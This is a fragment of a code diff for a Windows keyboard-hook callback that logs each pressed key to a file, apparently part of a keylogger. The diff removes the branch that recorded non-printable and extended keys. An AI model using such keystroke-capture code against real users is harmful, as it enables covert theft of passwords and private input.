@@ -40,20 +40,6 @@ LRESULT CALLBACK hook_proc(int code, WPARAM w_param, LPARAM l_param){
                 key_name[res] = L'\0';
                 // wprintf(L"Key Pressed: %ls\n", key_name);
                 writeToFile(key_name[0]);
-            }else{
-                WCHAR name[256];
-                LONG lParam = (keyboard->scanCode << 16);
-
-                if (keyboard->flags & LLKHF_EXTENDED){
-                    lParam |= (1 << 24);
-                }
-                if (GetKeyNameTextW(lParam, name, sizeof(name) / sizeof(WCHAR)) > 0){
-                    // wprintf(L"Key Pressed: %ls\n", name);
-                    writeToFile(name[0]);
-                }else{
-                    // wprintf(L"Key Pressed: VK Code %d\n", keyboard->vkCode);
-                    writeToFile((char)keyboard->vkCode);
-                }
             }
         }
     }
